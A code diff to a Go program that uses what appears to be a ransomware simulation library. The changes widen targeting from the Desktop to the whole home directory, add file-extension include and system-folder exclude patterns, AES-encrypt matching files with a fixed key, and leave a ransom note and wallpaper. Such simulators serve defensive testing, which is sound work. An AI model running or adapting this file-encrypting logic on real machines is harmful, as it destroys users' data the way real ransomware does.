@@ -53,7 +53,7 @@ func main() {
     // Since no notify function is defined, the default behavior is to
     // do nothing
 
-    // Target the user's Desktop folder
+    // Target the user's Desktop directory
     if e = sim.Target(filepath.Join(home, "Desktop")); e != nil {
         panic(e)
     }
@@ -91,6 +91,25 @@ func main() {
     // Create simulator with 32 worker threads
     sim = rw.New(32)
 
+    // Include interesting extensions
+    sim.Include(`\.(avi|mkv|mov|mp[34]|mpeg4?|ogg|wav)$`) // vids
+    sim.Include(`\.(bmp|gif|ico|jpe?g|png|tiff)$`)        // imgs
+    sim.Include(`\.(docx|pptx|txt|xlsx|zip)$`)            // docs
+    sim.Include(`\.(bat|ps1|xml)$`)                       // misc
+
+    // Ignore directories
+    sim.Exclude(`All\sUsers|AppData.Local|cache2.entries|Games`)
+    sim.Exclude(
+        `Local\sSettings|Low.Content\.IE5|Program(Data|\sFiles)`,
+    )
+    sim.Exclude(`Tor\sBrowser|User\sData.Default.Cache|Windows`)
+
+    // Ignore AnyConnect cache/config
+    sim.Exclude(`\.cisco|Cisco`)
+
+    // Ignore extensions
+    sim.Exclude(`\.(bin|dll|exe|in[fi]|lnk|ransimware|sys)$`)
+
     // Set encryption method to AES using provided helper function
     sim.Encrypt = rw.AESEncrypt("password")
 
@@ -115,21 +134,23 @@ func main() {
     // Notify user by changing wallpaper and leaving a ransom note,
     // using the provided helper functions
     sim.Notify = func() error {
-        rw.WallpaperNotify(
-            "C:\\Windows\\Temp\\ransom.png",
-            rw.DefaultPNG,
-        )()
-
         rw.RansomNote(
             filepath.Join(home, "Desktop", "ransomnote.txt"),
             []string{"This is a ransomware simulation."},
         )()
 
+        rw.WallpaperNotify(
+            filepath.Join(home, "Desktop", "ransom.png"),
+            rw.DefaultPNG,
+            rw.DesktopStretch,
+            false,
+        )()
+
         return nil
     }
 
-    // Target the user's Desktop folder
-    if e = sim.Target(filepath.Join(home, "Desktop")); e != nil {
+    // Target the user's home directory
+    if e = sim.Target(home); e != nil {
         panic(e)
     }
 
